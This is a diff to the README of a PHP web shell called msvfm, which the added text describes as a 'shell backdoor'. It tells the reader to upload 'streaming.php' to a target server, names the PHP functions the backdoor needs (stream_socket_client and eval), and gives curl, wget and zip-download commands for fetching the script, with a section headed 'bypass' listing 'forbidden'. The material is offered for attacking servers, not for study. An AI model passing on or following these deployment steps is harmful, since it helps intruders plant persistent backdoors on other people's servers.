@@ -1,5 +1,5 @@
 # msvfm
-msvfm v2 
+msvfm v2 shell backdoor streaming
 
 # update 
 - UI
@@ -8,6 +8,26 @@ msvfm v2
 
 # preview
 ![msvfm](https://raw.githubusercontent.com/MSVerse/msvfm/main/msvfm.jpg) 
+
+# run
+upload file "streaming.php" to server target and happy ending
+
+Requirements to enable msvfm streaming.php
+```
+stream_socket_client
+eval
+```
+
+# download script
+with curl & wget
+```
+curl -O https://raw.githubusercontent.com/MSVerse/msvfm/main/streaming.php
+wget https://raw.githubusercontent.com/MSVerse/msvfm/main/streaming.php
+```
+zip file
+```
+https://github.com/MSVerse/msvfm/archive/refs/heads/main.zip
+```
 
 # bypass 
 - forbidden
